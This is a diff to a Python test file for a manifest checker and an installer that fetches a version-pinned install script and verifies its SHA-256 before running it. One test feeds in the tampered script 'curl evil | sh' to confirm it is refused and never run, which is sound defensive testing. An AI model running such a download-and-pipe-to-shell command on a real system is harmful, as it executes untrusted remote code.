@@ -51,9 +51,13 @@ def entry(path, repo="r/a", revision=REV, **kw):
     return e
 
 
+RIG_PIN = {"repo": "me/rig", "version": "v1.0.0", "install_sha256": "0" * 64}
+
+
 class Manifest(unittest.TestCase):
     def test_real(self):
         m = manifest.load(REAL)
+        self.assertRegex(m["rig"]["version"], r"^v[0-9]+\.[0-9]+\.[0-9]+$")
         self.assertEqual(set(m["packs"]), {"ud-iq1_s", "ud-iq1_m"})
         self.assertEqual(m["packs"]["ud-iq1_s"]["table"]["slot"], [5, 5])
 
@@ -70,6 +74,9 @@ class Manifest(unittest.TestCase):
         self.refused(lambda m: m["packs"]["ud-iq1_s"]["shards"].append("nope"), "nope")
         self.refused(lambda m: m["packs"]["ud-iq1_s"]["table"].update(slot=[6, 5]), "slot")
         self.refused(lambda m: m["packs"]["ud-iq1_s"].update(shards=[]), "shards")
+        self.refused(lambda m: m["rig"].update(version="latest"), "rig")             # a tag, not a moving name
+        self.refused(lambda m: m["rig"].update(install_sha256="abc"), "rig")
+        self.refused(lambda m: m.pop("rig"), "rig")
         self.refused(lambda m: m.update(version=2), "version")
 
 
@@ -159,7 +166,7 @@ class Layout(unittest.TestCase):
             picks = os.path.join(have, "osmos-picks.bin")
             put(picks, b"p" * 64)
             table_before = sha(table)
-            m = {"version": 1, "files": {
+            m = {"version": 1, "rig": RIG_PIN, "files": {
                 "s1": entry(shards[0]), "s2": entry(shards[1]), "tab": entry(table, stamp=[1, 1]),
                 "pk": entry(picks, repo="me/osmos", revision=None)},
                 "packs": {"p": {"title": "t", "shards": ["s1", "s2"], "table": {"file": "tab", "slot": [3, 3]},
@@ -183,7 +190,7 @@ class Layout(unittest.TestCase):
         with tempfile.TemporaryDirectory() as d:
             p = os.path.join(d, "x.bin")
             put(p, b"x")
-            m = {"version": 1, "files": {"pk": entry(p, repo="me/osmos", revision=None)},
+            m = {"version": 1, "rig": RIG_PIN, "files": {"pk": entry(p, repo="me/osmos", revision=None)},
                  "packs": {"p": {"title": "t", "shards": ["pk"], "table": None, "picks": None, "drafter": [],
                                  "overlay": None, "settings": {}}}}
             manifest.check(m)
@@ -211,6 +218,34 @@ class Host(unittest.TestCase):
 
 class Rig(unittest.TestCase):
     CFG = {"pack": "ud-iq1_s", "model": "/m/ud-iq1_s/M-00001-of-00005.gguf", "max_context": 1048576}
+
+    PIN = {"repo": "mrsirg97-rgb/rig", "version": "v3.5.0", "install_sha256": hashlib.sha256(b"echo hi\n").hexdigest()}
+
+    def test_ensure_leaves_a_rig_alone(self):
+        ran = []
+        self.assertEqual(rig.ensure(self.PIN, lambda: "/usr/bin/rig", lambda url: self.fail(url),
+                                    lambda script, env: ran.append(env)), "/usr/bin/rig")
+        self.assertEqual(ran, [])
+
+    def test_ensure_installs_the_pinned_rig(self):
+        found = iter([None, "/home/u/.local/bin/rig"])
+        got, ran = [], []
+        exe = rig.ensure(self.PIN, lambda: next(found), lambda url: got.append(url) or b"echo hi\n",
+                         lambda script, env: ran.append((script, env)))
+        self.assertEqual(exe, "/home/u/.local/bin/rig")
+        self.assertEqual(got, ["https://raw.githubusercontent.com/mrsirg97-rgb/rig/v3.5.0/install.sh"])
+        self.assertEqual(ran[0][0], b"echo hi\n")
+        self.assertEqual(ran[0][1]["RIG_VERSION"], "v3.5.0")                     # its binary the pinned release's
+
+    def test_ensure_refuses_a_script_not_the_pinned_one(self):
+        ran = []
+        with self.assertRaisesRegex(rig.RigError, "SHA-256"):
+            rig.ensure(self.PIN, lambda: None, lambda url: b"curl evil | sh\n", lambda s, e: ran.append(s))
+        self.assertEqual(ran, [])                                                   # never run
+
+    def test_ensure_refuses_an_install_that_left_no_rig(self):
+        with self.assertRaisesRegex(rig.RigError, "no rig"):
+            rig.ensure(self.PIN, lambda: None, lambda url: b"echo hi\n", lambda s, e: None)
 
     def test_window_under_the_reply_refused(self):
         with tempfile.TemporaryDirectory() as home:                   # rig refuses reserve >= window: refused first
